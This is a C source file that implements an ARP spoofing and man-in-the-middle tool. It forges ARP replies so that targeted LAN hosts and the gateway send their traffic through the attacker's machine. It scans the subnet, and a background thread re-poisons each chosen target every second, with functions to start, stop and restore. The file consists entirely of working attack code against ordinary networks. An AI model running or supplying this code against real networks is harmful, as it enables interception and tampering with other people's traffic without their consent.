#include "cheater.h"

#include <pthread.h>
#include <stdlib.h>

#include "common.h"
#include "router.h"
#include "net_state.h"
#include "queue.h"


pthread_t   cheater             = 0;
void        *queue              = 0;

// cheater control code
struct c_c_c
{
    unsigned int    type;
#define ADD_MITM_WITH_ROUTE                     0
#define ADD_MITM_IM_ROUTE                       1
#define DELETE_TARGET                           2

    unsigned int    target;
};



int
cheater_arp_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned short  opcode,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    unsigned char   packet[42]  = {0};
    struct _ethhdr  *eth        = packet;
    struct _arphdr  *arp        = packet + sizeof(struct _ethhdr);

    if(target_mac)
    {
        memcpy(eth->h_dest, target_mac, 6);
        if(_ARP_REPLY == opcode)
        {
            memcpy(arp->ar_tha, target_mac, 6);
        }
    }
    if(source_mac)
    {
        memcpy(eth->h_source, source_mac, 6);
        memcpy(arp->ar_sha, source_mac, 6);
    }

    eth->h_proto    = _ntoh16(_ETH_P_ARP);

    arp->ar_hrd     = _ntoh16(0x1);
    arp->ar_pro     = _ntoh16(_ETH_P_IP);
    arp->ar_hln     = 6;
    arp->ar_pln     = 4;
    arp->ar_op      = _ntoh16(opcode);

    memcpy(arp->ar_sip, &source_ip, 4);
    memcpy(arp->ar_tip, &target_ip, 4);

    return _SEND_PACKAGE(packet, sizeof(packet)/sizeof(*packet));
}


int
cheater_arp_reply_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    target_mac  = target_mac ? target_mac : "\xff\xff\xff\xff\xff\xff";
    return cheater_arp_sender(  target_mac,                                    \
                                source_mac,                                    \
                                _ARP_REPLY,                                    \
                                target_ip,                                     \
                                source_ip);
}


int
cheater_arp_request_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    target_mac  = target_mac ? target_mac : "\xff\xff\xff\xff\xff\xff";
    return cheater_arp_sender(  target_mac,                                    \
                                source_mac,                                    \
                                _ARP_REQUEST,                                  \
                                target_ip,                                     \
                                source_ip);
}


int
cheater_arp_request_broadcast_sender(
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    return cheater_arp_request_sender(0, source_mac, target_ip, source_ip);
}


int
cheater_arp_throw_shit(unsigned int target, unsigned int iwannabe)
{
    if(false == is_device_online(target) || false == is_device_online(iwannabe))
    {
        return false;
    }

    return cheater_arp_reply_sender(device_mac_address(target),
                                    my_mac_address(),
                                    target,
                                    iwannabe);
}


int
cheater_arp_mitm(unsigned int t1, unsigned int t2)
{
    return cheater_arp_throw_shit(t1, t2) && cheater_arp_throw_shit(t2, t1);
}


int
cheater_arp_im_route(unsigned int target_netint32)
{
    return cheater_arp_throw_shit(target_netint32, route_ip_netint32());
}


int
cheater_arp_with_route(unsigned int target_netint32)
{
    return cheater_arp_mitm(target_netint32, route_ip_netint32());
}


int
cheater_arp_mitm_restore(unsigned int target)
{
    if(false == 
        is_device_online(target) & is_device_online(route_ip_netint32()) )
    {
        return false;
    }

    return  cheater_arp_reply_sender(   device_mac_address(target),
                                        device_mac_address(route_ip_netint32()),
                                        target,
                                        route_ip_netint32()) &&
            cheater_arp_reply_sender(   device_mac_address(route_ip_netint32()),
                                        device_mac_address(target),
                                        route_ip_netint32(),
                                        target);
}



void
cheater_arp_ask_all(void)
{
    int i   = 0;
    int max = device_max();
    for(i=0; i<max; i++)
    {
        cheater_arp_request_broadcast_sender(
                    my_mac_address(),
                    merge_device_index_to_ip_netint32(i),
                    my_ip_netint32());
    }
}


void
cheater_set_cheat_off_all(void)
{
    int i   = 0;
    int max = device_max();
    for(i=0; i<max; i++)
    {
        set_cheat_state_clean(merge_device_index_to_ip_netint32(i));
    }
}


void
cheater_thread_worker_sender(void)
{
    int             i       = 0;
    unsigned int    target  = 0;
    unsigned char   state   = 0;
    int             max     = device_max();

    int (*cheater_fun)(unsigned int)    = 0;

    for(i=0; i<max; i++)
    {
        target  = merge_device_index_to_ip_netint32(i);
        state   = get_cheat_state(target);

        if(CHEAT_OFF == state)
        {
            continue;
        }

        switch(get_cheat_mode(target))
        {
            case CHEAT_MODE_MITM:
                cheater_fun = cheater_arp_with_route;
                break;
            case CHEAT_MODE_TARGET:
                cheater_fun = cheater_arp_im_route;
                break;
            default:
                cheater_fun = cheater_arp_with_route;
                break;
        }

        if(CHEAT_ON == state)
        {
            (*cheater_fun)(target);
            continue;
        }

        if(CHEAT_DELAY == state)
        {
            cheater_arp_mitm_restore(target);
            continue;
        }
    }
}


void*
cheater_thread_worker(void *mq)
{
    struct c_c_c    *cm = 0;
    unsigned int    len = 0;
    int             ret = 0;
    cheater_set_cheat_off_all();

    do
    {
        sleep(1);
        cheater_thread_worker_sender();

        for(;;)
        {
            cm  = 0;
            ret = queue_read_message(mq, &cm, &len, 0);
            if(QEUUE_NO_MSG == ret || 0 == cm || QUEUE_END == ret)
            {
                break;
            }

            switch(cm->type)
            {
                case ADD_MITM_WITH_ROUTE:
                    set_cheat_on(cm->target);
                    set_cheat_mode(cm->target, CHEAT_MODE_MITM);
                    break;
                case ADD_MITM_IM_ROUTE:
                    set_cheat_on(cm->target);
                    set_cheat_mode(cm->target, CHEAT_MODE_TARGET);
                    break;
                case DELETE_TARGET:
                    set_cheat_off(cm->target);
                    break;
            }
        }
    }while(QUEUE_END != ret);

    int i = 12;
    do
    {
        cheater_thread_worker_sender();
        sleep(1);
    }while( i -- );

    return 0;
}


int
cheater_start(void)
{
    int err = 0;

    queue   = queue_create(0, 0);
    if(0 == queue || cheater)
    {
        return false;
    }

    err = pthread_create(&cheater, 0, cheater_thread_worker, queue);
    if(err)
    {
        queue = queue_destory(queue);
        return false;
    }

    return true;
}


void
cheater_stop(void)
{
    if(queue)
    {
        queue_write_end(queue);
        queue   = 0;
    }
}


int
cheater_add(unsigned int ip_netint32, unsigned char mode)
{
    struct c_c_c    cm  = {0};

    if(0 == queue)
    {
        return false;
    }

    cm.type     = (mode == 0 ? ADD_MITM_WITH_ROUTE : ADD_MITM_IM_ROUTE);
    cm.target   = ip_netint32;

    queue_write_message(queue, &cm, sizeof(struct c_c_c), 0);

    return true;
}


int
cheater_add_mitm(unsigned int ip_netint32)
{
    return cheater_add(ip_netint32, 0);
}


int
cheater_delete(unsigned int ip_netint32)
{
    struct c_c_c    cm  = {0};

    if(0 == queue)
    {
        return false;
    }

    cm.type     = DELETE_TARGET;
    cm.target   = ip_netint32;

    queue_write_message(queue, &cm, sizeof(struct c_c_c), 0);

    return true;
}


void
cheater_scan(void)
{
    cheater_arp_ask_all();
}








